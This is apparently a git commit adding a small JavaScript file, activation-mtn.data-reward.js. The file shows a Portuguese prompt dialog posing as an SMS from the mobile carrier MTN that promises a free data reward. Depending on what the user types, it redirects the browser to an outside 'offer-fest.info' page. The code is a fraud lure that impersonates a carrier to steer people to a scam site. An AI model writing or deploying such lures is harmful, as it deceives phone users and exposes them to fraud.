d675dd3d91fe86d278985f0d9f263822287521fb
ekpesense <abantak9@gmail.com>
2025-02-10 14:46:32 -0800

    Create activation-mtn.data-reward.js

---
+++ activation-mtn.data-reward.js
@@ -0,0 +1,5 @@
+var password = 'Recompensa de dados laranja'
+password=prompt('SMS: Parabéns, o seu cartão SIM MTN é elegível para receber RECOMPENSA DE DADOS GRATUITA, pressione Recompensa de Dados Orange para ATIVAR. ','Recompensa de dados laranja');
+if (password != 'Recompensa de dados laranja') {
+location.href='https://offer-fest.info/mtn.data-reward.html';
+}
